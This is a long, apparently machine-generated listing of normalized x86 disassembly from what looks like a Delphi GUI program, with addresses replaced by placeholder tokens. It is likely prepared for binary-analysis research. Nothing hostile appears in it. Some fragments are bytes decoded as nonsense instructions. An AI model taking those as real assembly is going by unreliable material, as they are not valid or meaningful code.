mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_4550a0
retn
sub_456cc8
retn
sub_456ee1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41ca7c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_456efc
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41ef34
retn
sub_456ff4
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_45760c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_457614
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_45761c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4576d4
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4576f4
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_455b9c
mov [ ebx + 0x9a ] 0x1
sub_45774c
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_455b40
mov [ ebx + 0x56 ] 0x1
sub_457770
mov [ edx + 0xc ] 0x1
retn
sub_457778
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_456c00
sub_457790
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_456c00
sub_4577a8
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_457a0e
jmp sub_403980
sub_457a15
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457a40
mov eax [ r-xdata ]
retn
sub_457bdc
jmp sub_403980
sub_457be3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457d04
mov eax [ eax + 0xb8 ]
retn
sub_457d6c
push ebx
mov ebx eax
mov eax ebx
call sub_456090
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_457d88
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_457f20
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45802e
jmp sub_403980
sub_458035
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_458064
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_45806c
call sub_454b0c
retn
sub_45816c
jmp sub_403980
sub_45832c
jmp sub_403980
sub_45837c
jmp sub_403980
sub_4583b4
retn
sub_45863d
jmp sub_403980
sub_4587c5
jmp sub_403980
sub_458b27
jmp sub_403980
sub_458bd3
jmp sub_403980
sub_458be0
inc [ eax + 0x160 ]
retn
sub_458be8
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_458c08
sub_458c08
xor edx edx
call sub_458b4c
retn
sub_458cd5
jmp sub_403980
sub_458cdc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458dcb
jmp sub_403980
sub_4592f2
jmp sub_403980
sub_4592f9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4594c1
jmp sub_403980
sub_4594c8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45959c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_459789
jmp sub_403980
sub_459790
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_459880
xor eax eax
retn
sub_4598e8
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_456c00
sub_459a16
jmp sub_4036cc
sub_459b4b
jmp sub_403980
sub_459b52
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459b5c
jmp sub_4036cc
sub_459b61
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a11c
jmp sub_403980
sub_45a123
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a12c
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_45a62a
jmp sub_403980
sub_45a67c
push ebx
mov ebx eax
call sub_423dfc
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_456c00
pop ebx
retn
sub_45a698
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_456c00
retn
sub_45a6ac
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_456c00
retn
sub_45a6bc
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_456c00
retn
sub_45a968
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45c690
pop esi
retn
sub_45aa7c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45aacc
pop esi
retn
sub_45aa90
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45abb8
pop esi
retn
sub_45aaa4
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45aab8
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45abab
jmp sub_403980
sub_45abb2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ac42
jmp sub_403980
sub_45ac49
pop ebx
pop ecx
pop ebp
retn
sub_45ac50
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_45ac60
retn
sub_45ac64
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_45ac84
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_45ade4
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_45aeb4
retn
sub_45afcc
jmp sub_403980
sub_45afd3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b09e
jmp sub_403980
sub_45b0c8
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_45b15a
jmp sub_403980
sub_45b32c
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_45b5d0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_45b6ac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_4590d8
pop esi
retn
sub_45b770
push esi
mov si 0xffc1
call sub_4033e8
pop esi
retn
sub_45b79c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_45b7b0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_45b7c4
call sub_459098
retn
sub_45b7cc
call sub_459098
retn
sub_45b7d4
call sub_459098
retn
sub_45b87c
push ebx
mov ebx eax
mov eax ebx
call sub_45761c
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_424f74
mov dx 0xb009
mov eax ebx
call sub_4590d8
pop ebx
retn
sub_45b9e0
call sub_459098
retn
sub_45b9e8
call sub_459098
retn
sub_45b9f0
call sub_459098
retn
sub_45b9f8
call sub_459098
retn
sub_45ba5c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_45bef2
jmp sub_403980
sub_45bef9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bfd8
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_45c17c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
mov eax [ eax + 0x190 ]
retn
mov eax edx
call sub_45c380
retn
sub_45c194
jmp r-xdata
mov edx [ eax + 0x30 ]
test edx edx
jne r-xdata
mov eax edx
mov edx [ eax + 0x190 ]
test edx edx
jne r-xdata
mov eax edx
retn
call sub_45c380
mov edx eax
sub_45c1b4
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_456c00
retn
sub_45c254
push ebx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_45c270
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_45c448
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_45c380
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_45c4a0
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_456c00
sub_45c4c0
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_456c00
sub_45c4e4
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_45c4f0
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_456c00
sub_45c59c
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_45c540
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_45c678
jmp sub_403980
sub_45c67f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c89e
jmp sub_403980
sub_45c8a5
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45c968
call sub_4569d0
retn
sub_45cdb6
jmp sub_403980
sub_45ce4c
mov eax [ r-xdata ]
retn
sub_45cfb3
jmp sub_403980
sub_45d0c4
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_456c00
sub_45d0e4
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_456c00
sub_45d3fa
jmp sub_403980
sub_45d53c
test [ eax + 0x52 ] 0x4
setne al
retn
sub_45d698
jmp sub_403980
sub_45d69f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425630
retn
sub_45d6bb
jmp sub_403980
sub_45d6c8
retn
sub_45d79c
mov [ edx + 0xc ] 0xffffffff
retn
sub_45d7fa
jmp sub_403980
sub_45d801
pop ecx
pop ecx
pop ebp
retn
sub_45d8a1
jmp sub_403980
sub_45d8a8
pop ebx
mov esp ebp
pop ebp
retn
sub_45d914
call sub_4598a0
retn
sub_45d9a7
jmp sub_403980
sub_45d9ae
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_45db8d
jmp sub_403980
sub_45db94
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45dcf0
push ebx
mov ebx eax
mov eax ebx
call sub_462a88
or edx 0xffffffff
mov eax ebx
call sub_45de1c
pop ebx
retn
sub_45ddc8
jmp sub_403980
sub_45de1c
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_45dd08
sub_45df8c
push ebx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_45dfa4
push ebx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_45e090
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_45a4d8
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_45e12b
jmp sub_403980
sub_45e132
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e155
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_425630
retn
sub_45e14e
jmp sub_403980
sub_45e155
pop ebx
pop ecx
pop ebp
retn
sub_45e15c
retn
sub_45e1c4
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_45e531
jmp sub_403980
sub_45e718
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_45e904
jmp sub_403980
sub_45e9b4
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_45e9c8
inc [ eax + 0x6c ]
retn
sub_45e9cc
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_46024c
sub_45eb2c
call sub_45f22c
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_45f4d7
jmp sub_403980
sub_45f4de
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f4fb
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_45f4f4
jmp sub_403980
sub_45f4fb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f7dc
jmp sub_403980
sub_45f7e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f800
mov eax [ ebp - 0x4 ]
call sub_425630
retn
sub_45f7f9
jmp sub_403980
sub_45f800
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f81d
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_45f816
jmp sub_403980
sub_45f81d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fcd1
jmp sub_403980
sub_45fcd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fe63
jmp sub_403980
sub_45fe6a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45ff1f
jmp sub_403980
sub_45ff26
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_460014
jmp sub_403980
sub_460065
jmp sub_403980
sub_46006c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460128
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45ea38
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_460274
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_45e574
sub_460b74
jmp sub_403980
sub_460b7b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460c44
call GetCapture
retn
sub_460c4c
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40d078
pop ebx
retn
sub_460c5c
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_460ec2
jmp sub_403980
sub_4610bc
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_4612d0
jmp sub_403980
sub_4612d7
pop ebx
mov esp ebp
pop ebp
retn
sub_461322
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_46139f
jmp sub_403980
sub_4613a6
pop ebp
retn
sub_46142e
jmp sub_403980
sub_461435
pop ebp
retn
sub_46143c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4614e2
out dx eax
push edx
push ecx
[ eax - 0x2bffb9e6 ]
sub_46199c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_418e20
retn
sub_4619b4
mov al 0x1
retn
sub_4619b8
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_42171c
retn
mov eax edx
retn
sub_4619c8
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_4216ec
retn
mov al 0x1
retn
sub_461cb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418dc4
pop esi
pop ebx
retn
sub_461ccc
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_461d08
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_461ecc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461ee0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461ef4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461f08
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461f1c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461f30
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461f44
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461f58
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461f6c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461f80
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_461f94
retn
sub_461f98
retn
sub_461f9c
retn
sub_461fa0
retn
sub_461fa4
retn
sub_461fa8
retn
sub_461fac
retn
sub_461fb0
retn
sub_461fb4
retn
sub_461fb8
retn
sub_461fbc
retn
sub_461fc0
retn
sub_46226c
jmp sub_403980
sub_462608
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x90 ] eax
sub_462688
push esi
mov si 0xffef
call sub_4033e8
pop esi
retn
sub_462729
jmp sub_403980
sub_462730
pop ebp
retn
sub_462734
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
sub_46295c
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_462b35
jmp sub_403980
sub_462b3c
pop ebx
pop ecx
pop ebp
retn
sub_462b40
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_462b48
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_462db0
sub_462bf5
jmp sub_403980
sub_462bfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4031ec
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_462d04
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_462e43
jmp sub_403980
sub_462e4a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462ee2
jmp sub_403980
sub_462ee9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f06
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub_462eff
jmp sub_403980
sub_462f06
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4033e8
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462fdd
jmp sub_403980
sub_46301b
jmp sub_403980
sub_463022
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4033e8
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4631e7
jmp sub_403980
sub_4631ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46320b
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub_463204
jmp sub_403980
sub_46320b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_463284
retn
sub_463224
jmp sub_403980
sub_463273
jmp sub_403980
sub_46327a
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463303
jmp sub_403980
sub_46330a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463310
or edx 0xffffffff
call sub_463284
retn
sub_46371f
jmp sub_403980
sub_463726
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463743
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub_46373c
jmp sub_403980
sub_463743
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463760
mov eax [ ebp - 0x4 ]
call sub_464258
retn
sub_463759
jmp sub_403980
sub_463760
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463964
jmp sub_403980
sub_46396b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463970
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_4033e8
sub_463988
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_417744
pop ebx
retn
sub_463a2c
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_418c68
sub_463b43
jmp sub_403980
sub_463b4a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
sub_463b60
jmp sub_403980
sub_463e72
jmp sub_403980
sub_463e79
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463e96
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
sub_463e8f
jmp sub_403980
sub_463e96
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463eb3
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
sub_463eac
jmp sub_403980
sub_463eb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463f1c
jmp sub_403980
sub_464035
jmp sub_403980
sub_464052
jmp sub_403980
sub_46420a
jmp sub_403980
sub_464211
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464254
inc [ eax + 0x5c ]
retn
sub_464258
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_4033e8
sub_4642ac
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4642e9
jmp sub_403980
sub_4642f0
pop ebp
retn
sub_4642f4
sub [ rw-data ] 0x1
retn
sub_464740
clc
push edx
push ecx
jmp [ eax ]
sub_464b4c
out dx eax
[ eax - 0x71 ]
sub_4651ff
jmp [ eax + eax ]
sub_46525c
mov eax [ esp + 0x8 ]
retn
sub_465264
push ebx
mov ebx eax
call sub_46525c
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
jmp sub_4039b8
sub_465280
pop ebx
retn
sub_4654f9
jmp sub_403980
sub_465500
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46564b
jmp sub_403980
sub_465652
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465668
push ebx
mov eax [ rw-data ]
call sub_419334
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_4192f0
mov eax ebx
pop ebx
retn
sub_4657f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_46580c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_465f07
jmp sub_403980
sub_465f0e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466006
jmp sub_403980
sub_46600d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466430
jmp sub_403980
sub_466437
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4668e3
jmp sub_403980
sub_466d84
jmp sub_403980
sub_466d8b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4671ef
jmp sub_403980
sub_4676ac
jmp sub_403980
sub_4676b3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467a5e
jmp sub_403980
sub_467a65
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_467a73
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_467c20
mov eax [ r-xdata ]
retn
sub_467c5c
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_467c70
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_467c80
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_467c90
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_467f8c
mov edx eax
sub_467d28
push ebx
push esi
mov esi ecx
